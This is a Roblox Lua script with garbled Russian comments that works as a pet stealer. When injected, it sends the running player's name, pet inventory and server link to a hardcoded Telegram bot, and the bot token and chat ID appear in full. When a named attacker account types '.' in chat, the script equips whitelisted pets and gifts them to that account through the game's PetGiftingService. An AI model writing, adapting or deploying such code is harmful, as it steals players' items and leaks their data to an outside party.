local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- üîß –ù–ê–°–¢–†–û–ô–ö–ò
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sfdgbzdfsb"
local TRIGGER_MESSAGE = "."

-- üêæ –ë–ï–õ–´–ô –°–ü–ò–°–û–ö –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ (—Ç–æ–ª—å–∫–æ —ç—Ç–∏ –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å—Å—è)
local WHITELIST = {
    "Hamster",
}

-- üîé –ù–∞–π—Ç–∏ –í–°–ï–• –ø–∏—Ç–æ–º—Ü–µ–≤ (—Å –≤–µ—Å–æ–º –∏ –≤–æ–∑—Ä–∞—Å—Ç–æ–º)
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- –ò—â–µ–º —Ñ–æ—Ä–º–∞—Ç "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- –ë–µ—Ä–µ–º –æ—Å–Ω–æ–≤–Ω–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ (–¥–æ –ø–µ—Ä–≤—ã—Ö –∫–≤–∞–¥—Ä–∞—Ç–Ω—ã—Ö —Å–∫–æ–±–æ–∫)
                local petName = item.Name:match("^([^%[]+)") or item.Name
                petName = petName:gsub("%s+$", "")

                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    -- –§–ª–∞–≥ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end

    return pets
end

-- üìú –§–æ—Ä–º–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è (–í–°–ï –ø–∏—Ç–æ–º—Ü—ã)
local function getFullPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "–Ω–µ—Ç –ø–∏—Ç–æ–º—Ü–µ–≤" end

    local list = {}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "‚úì" or "‚úó"
        table.insert(list, string.format("%s %s [%.2f –∫–≥, Age %d]", status, pet.name, pet.weight, pet.age))
    end

    return table.concat(list, "\n")
end

-- üì® –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram (—Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫)
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    local success, err = pcall(function() game:HttpGet(url) end)
    if not success then
        warn("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram: "..tostring(err))
    end
end

-- üîó –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä (—Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –Ω–∞–ª–∏—á–∏—è jobId)
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    if not jobId or jobId == "" then
        return "https://www.roblox.com/games/"..placeId
    end
    return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
end

-- üèÅ –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø: —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –∏–Ω–∂–µ–∫—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
local function sendInitialNotification()
    local petsList = getFullPetsList()
    local message =
        "üîî –ò–≥—Ä–æ–∫ "..player.Name.." –∑–∞–ø—É—Å—Ç–∏–ª —Å–∫—Ä–∏–ø—Ç\n\n"..
        "üêæ –ü–∏—Ç–æ–º—Ü—ã:\n"..petsList.."\n\n"..
        "üîó –°—Å—ã–ª–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä:\n"..getServerLink()
    sendToTelegram(message)
end

sendInitialNotification()

-- üëÇ (–ø–æ –∂–µ–ª–∞–Ω–∏—é) —Å–ª—É—à–∞—Ç–µ–ª—å —á–∞—Ç–∞ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –ø–∏—Ç–æ–º—Ü–µ–≤ (–æ—Å—Ç–∞–≤–∏–ª –∏–∑ —Ç–≤–æ–µ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞)
local function equipPet(pet)
    if pet and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
        return true
    end
    return false
end

local function transferPet(pet)
    if not pet.isWhitelisted then return false end
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("‚ùå –ù–µ—Ç –ø–∏—Ç–æ–º—Ü–µ–≤ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏")
        return
    end

    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            if equipPet(pet.object) then
                if transferPet(pet) then
                    transferred += 1
                end
                task.wait(2)
            end
        end
    end

    local report = {"üèÅ –ò—Ç–æ–≥–æ –ø–µ—Ä–µ–¥–∞–Ω–æ: "..transferred.." –∏–∑ "..#pets.."\n\nüêæ –°–ø–∏—Å–æ–∫ –ø–∏—Ç–æ–º—Ü–µ–≤:\n"}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "‚úì" or "‚úó"
        table.insert(report, string.format("%s %s [%.2f –∫–≥, Age %d]", status, pet.name, pet.weight, pet.age))
    end
    sendToTelegram(table.concat(report, "\n"))
end

-- === –ù–û–í–´–ô –ö–û–î: –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ —á–∞—Ç —á–µ—Ä–µ–∑ TextChatService ===

if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        local speaker = Players:FindFirstChild(message.TextSource.Name)
        if speaker and speaker.Name == TARGET_PLAYER and message.Text == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end
else
    -- fallback –Ω–∞ —Å—Ç–∞—Ä–æ–µ —Å–æ–±—ã—Ç–∏–µ (–µ—Å–ª–∏ TextChatService –Ω–µ—Ç)
    Players.PlayerChatted:Connect(function(chatType, speaker, message)
        if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end)
end
